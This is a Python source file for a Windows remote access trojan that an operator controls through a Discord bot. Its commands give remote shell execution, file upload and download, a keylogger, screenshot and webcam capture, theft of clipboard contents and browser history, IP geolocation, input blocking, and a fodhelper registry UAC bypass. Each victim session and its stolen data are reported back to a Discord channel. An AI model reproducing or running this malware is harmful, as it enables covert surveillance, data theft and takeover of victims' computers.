# -*- coding: utf-8 -*-
import winreg
import ctypes
import sys
import os
import uuid
import random
import time
import subprocess
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
import discord
from discord import utils
token = '' #Put the token of your discord bot here
global appdata
appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
chosen = None
uuidgen = None
helpmenu = """
Availaible commands are :

--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !window = Get infected computer user current active window
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get computer navigation history
--> !download = Download a file from infected computer
--> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
--> !cd = Changes directory
--> !write = Type your desired sentence on infected computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with image attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !volumemax = Put volume at 100%
--> !volumezero = Put volume at 0%
--> !idletime = Get the idle time of user's on target computer
--> !sing = Play chosen video in background
--> !stopsing = Stop video playing in background
--> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
"""

@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    global uuidgen
    uuidgen = str(uuid.uuid4())
    import os
    game = discord.Game(f"Controlling : {platform.system()} {platform.release()}"  )
    await client.change_presence(status=discord.Status.online, activity=game)
    newchannel = await client.guilds[0].create_text_channel(uuidgen)
    channel_ = discord.utils.get(client.get_all_channels(), name=uuidgen)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here :white_check_mark: New session opened {uuidgen} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
    if is_admin == True:
        await channel.send(f'{value1} | :gem:')
    elif is_admin == False:
        await channel.send(value1)


def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

@client.event
async def on_message(message):
    if message.channel.name != uuidgen:
        pass
    else:
        if message.content == "!dumpkeylogger":
            import os
            temp = os.getenv("TEMP")
            file_keys = f"temp {key_log.txt}"
            file = discord.File(file_keys, filename=file_keys)
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.popen(f"del {file_keys}")

        if message.content == "!exit":
            import sys
            sys.exit()

        if message.content == "!window":
            import win32gui
            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            await message.channel.send(f"[*] User current active window is : {window}")

        if message.content == "!screenshot":
            import os
            from mss import mss
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
            file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))

        if message.content == "!volumemax":
            volumeup()
            await message.channel.send("[*] Volume put to 100%")

        if message.content == "!volumezero":
            volumedown()
            await message.channel.send("[*] Volume put to 0%")

        if message.content == "!webcampic": # This module downloads a file over the internet to take a webcampic this is not optimal at all but avoids adding many unnecessary megabytes to exe if compiled.
            import os
            import urllib.request
            from zipfile import ZipFile
            directory = os.getcwd()
            try:
                os.chdir(os.getenv('TEMP'))
                urllib.request.urlretrieve("https://www.nirsoft.net/utils/webcamimagesave.zip", "temp.zip")
                with ZipFile("temp.zip") as zipObj:
                    zipObj.extractall()
                os.system("WebCamImageSave.exe /capture /FileName temp.png")
                file = discord.File("temp.png", filename="temp.png")
                await message.channel.send("[*] Command successfuly executed", file=file)
                os.remove("temp.zip")
                os.remove("temp.png")
                os.remove("WebCamImageSave.exe")
                os.remove("readme.txt")
                os.remove("WebCamImageSave.chm")
                os.chdir(directory)
            except:
                await message.channel.send("[!] Command failed")

        if message.content.startswith("!message"):
            import ctypes
            import time
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con
            import win32gui
            def get_all_hwnd(hwnd,mouse): #Here define a statement looking through all visible windows titles find our message box then get the handle and show it in the foreground
                def winEnumHandler(hwnd, ctx):
                    if win32gui.IsWindowVisible(hwnd):
                        print(win32gui.GetWindowText(hwnd))
                    if win32gui.GetWindowText(hwnd) == "Error":
                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                        return None
                    else:
                        pass
                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                    win32gui.EnumWindows(winEnumHandler,None)
            win32gui.EnumWindows(get_all_hwnd, 0)

        if message.content.startswith("!wallpaper"):
            import ctypes
            import os
            path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            await message.channel.send("[*] Command successfuly executed")

        if message.content.startswith("!upload"):
            await message.attachments[0].save(message.content[8:])
            await message.channel.send("[*] Command successfuly executed")

        if message.content.startswith("!shell"):
            global status
            import time
            status = None
            import subprocess
            import os
            instruction = message.content[7:]
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell) #Use of threading and a global variable to avoid hanging if command is too long to produce an output 
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437')) #CP437 Decoding used for characters like " é " etc..
                print(result)
                numb = len(result)
                print(numb)
                if numb < 1:
                    await message.channel.send("[*] Command not recognized or no output was obtained")
                elif numb > 1990:
                    f1 = open("output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File("output.txt", filename="output.txt")
                    await message.channel.send("[*] Command successfuly executed", file=file)
                    os.popen("del output.txt")
                else:
                    await message.channel.send("[*] Command successfuly executed : " + result)
            else:
                await message.channel.send("[*] Command not recognized or no output was obtained")
                status = None

        if message.content.startswith("!download"):
            file = discord.File(message.content[10:], filename=message.content[10:])
            await message.channel.send("[*] Command successfuly executed", file=file)

        if message.content.startswith("!cd"):
            import os
            os.chdir(message.content[4:])
            await message.channel.send("[*] Command successfuly executed")

        if message.content == "!help":
            await message.channel.send(helpmenu)

        if message.content.startswith("!write"):
            import pyautogui
            if message.content[7:] == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(message.content[7:])

        if message.content == "!history":
            import os
            import browserhistory as bh
            dict_obj = bh.get_browserhistory()
            strobj = str(dict_obj).encode(errors='ignore')
            f3 = open('history.txt', 'a')
            f3.write(str(strobj))
            f3.close()
            file = discord.File("history.txt", filename="history.txt")
            await message.channel.send("[*] Command successfuly executed", file=file)
            os.popen("del history.txt")

        if message.content == "!clipboard":
            import ctypes
            import os
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + str(body))

        if message.content.startswith("!stopsing"):
            import os 
            os.system("taskkill /F /IM iexplore.exe")
            os.chdir(appdata)
            os.system("del x0.vbs")

        if message.content == "!sysinfo":
            import platform
            jak = str(platform.uname())
            intro = jak[12:]
            from requests import get
            ip = get('https://api.ipify.org').text
            pp = "IP Adress = " + ip
            await message.channel.send("[*] Command successfuly executed : " + intro + pp)

        if message.content == "!geolocate":
            import urllib.request
            import json
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send("[*] Command successfuly executed : " + link)

        if message.content == "!admincheck":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[*] Congrats you're admin")
            elif is_admin == False:
                await message.channel.send("[!] Sorry, you're not admin")

        if message.content == "!uacbypass":
            import os
            import win32net
            if 'logonserver' in os.environ:
                server = os.environ['logonserver'][2:]
            else:
                server = None
            def if_user_is_admin(Server):
                groups = win32net.NetUserGetLocalGroups(Server, os.getlogin())
                isadmin = False
                for group in groups:
                    if group.lower().startswith('admin'):
                        isadmin = True
                return isadmin, groups
            is_admin, groups = if_user_is_admin(server)
            # Result handeling
            if is_admin == True:
                print('User in admin group trying to bypass uac')
                import os
                import sys
                import ctypes
                import winreg
                CMD = "C:\\Windows\\System32\\cmd.exe"
                FOD_HELPER = 'C:\\Windows\\System32\\fodhelper.exe'
                COMM = "start"
                REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'
                DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

                def is_running_as_admin():
                    '''
                    Checks if the script is running with administrative privileges.
                    Returns True if is running as admin, False otherwise.
                    '''
                    try:
                        return ctypes.windll.shell32.IsUserAnAdmin()
                    except:
                        return False

                def create_reg_key(key, value):
                    '''
                    Creates a reg key
                    '''
                    try:
                        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
                        registry_key = winreg.OpenKey(
                            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
                        winreg.SetValueEx(registry_key, key, 0,
                                          winreg.REG_SZ, value)
                        winreg.CloseKey(registry_key)
                    except WindowsError:
                        raise

                def bypass_uac(cmd):
                    '''
                    Tries to bypass the UAC
                    '''
                    try:
                        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
                        create_reg_key(None, cmd)
                    except WindowsError:
                        raise

                def execute():
                    if not is_running_as_admin():
                        print(
                            '[!] The script is NOT running with administrative privileges')
                        print('[+] Trying to bypass the UAC')
                        try:
                            current_dir = os.path.dirname(
                                os.path.realpath(__file__)) + '\\' + sys.argv[0]
                            cmd = '{} /k {} {}'.format(CMD, COMM, current_dir)
                            print(cmd)
                            bypass_uac(cmd)
                            os.system(FOD_HELPER)
                            sys.exit(0)
                        except WindowsError:
                            sys.exit(1)
                    else:
                        print(
                            '[+] The script is running with administrative privileges!')
                if __name__ == '__main__':
                    execute()
            else:
                print("failed")
                await message.channel.send("[*] Command failed : User not in administator group")

        if message.content.startswith("!sing"):
            import os  #Bad code that I wrote long ago but since it's a dumb command it's not too big of a problem
            volumeup()
            os.chdir(appdata)   
            choice = message.content[6:]
            f1 = open('x0.vbs', 'a')
            f1.write('Set ie = CreateObject("InternetExplorer.Application")' + "\r\n")
            f1.write("ie.Visible = 0" + "\r\n")
            f1.write('ie.Navigate2' + ' ' + '"' + choice + '"')
            f1.close()
            os.system('x0.vbs')

        if message.content == "!startkeylogger":
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            log_dir = temp
            logging.basicConfig(filename=(log_dir + "key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
            def keylog():
                def on_press(key):
                    logging.info(str(key))
                with Listener(on_press=on_press) as listener:
                    listener.join()
            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger successfuly started")

        if message.content == "!stopkeylogger":
            import os
            test._running = False
            await message.channel.send("[*] Keylogger successfuly stopped")

        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0
            import threading
            global idle1
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()
            duration = get_idle_duration()
            await message.channel.send('User idle for %.2f seconds.' % duration)
            import time
            time.sleep(1)

        if message.content.startswith("!voice"):
            volumeup()
            import win32com.client as wincl
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(message.content[7:])
            comtypes.CoUninitialize()
            await  message.channel.send("[*] Command successfuly executed")

        if message.content.startswith("!blockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(True)
                await message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

        if message.content.startswith("!unblockinput"):
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                ok = windll.user32.BlockInput(False)
                await  message.channel.send("[*] Command successfuly executed")
            else:
                await message.channel.send("[!] Admin rights are required for this operation")

client.run(token)
